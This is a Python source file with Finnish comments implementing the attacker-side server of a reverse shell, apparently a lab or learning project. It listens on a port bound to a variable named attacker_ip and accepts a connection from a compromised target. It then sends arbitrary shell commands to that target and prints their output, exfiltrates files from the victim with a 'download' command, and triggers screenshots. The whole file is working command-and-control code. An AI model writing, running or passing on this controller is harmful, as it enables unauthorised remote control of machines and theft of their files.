import socket
import os

socket.setdefaulttimeout(15)

def clear_screen():
    os.system('cls')


def download(target, command):
    filename = command.split()[1]
    with open(filename, 'wb') as f:
        while True:
            bits = target.recv(1024)
            if b'DONE' in bits:
                f.write(bits[:-4])
                print('Transfer complete')
                break
            elif b'File not found' in bits:
                print('File not found')
                break
            else:
                f.write(bits)

#pääfunktio
def main():

    attacker_ip = '172.20.16.61' #192.168.83.1 VM
    port        = 8888
    
    #luodaan uusi socket objekti käyttämällä socket-funktiota
    #af_inet == ipv4, sock_stream == tcp-yhteys
    #bindataan ip & portti -> listen == maksimiyhteydet
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((attacker_ip, port))
    s.listen(1)
    print(f'[+] Awaiting for connection...\n')
    #accept metodi palauttaa -> target == itse yhteys kohteeseen
    # target_addr == tuple jossa index0 :ssa targetin ip ja index1:ssa väliaikaisportti
    target, target_addr = s.accept()

    print(f'[+] New connection from {target_addr[0]}')

    while True:
        #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
        command = input('>> ').encode()
        if command == b'exit':      #byteinä koska muutettiin se edellisellä rivillä
            target.send(command)    #vaikka lopetetaan niin kuitenkin tieto kohteeseen
            target.close()
            s.close()
            break
        elif command == b'':
            continue
        elif command == b'cls':
            clear_screen()
        elif command.startswith(b'download'):
            target.send(command)
            download(target,command)
        # elif command.startswith(b'upload'):
        #     upload(target,command)
        #     continue
        elif command == b'screen':
            print('Taking screenshot')
            target.send(command)
        else:
            target.send(command)
            #4kilotavua (pitäisi riittää) dataa back & decodataan bytet stringeiksi
            result = target.recv(4096).decode('ISO-8859-1')
            print(result)


if __name__ == '__main__':
    main()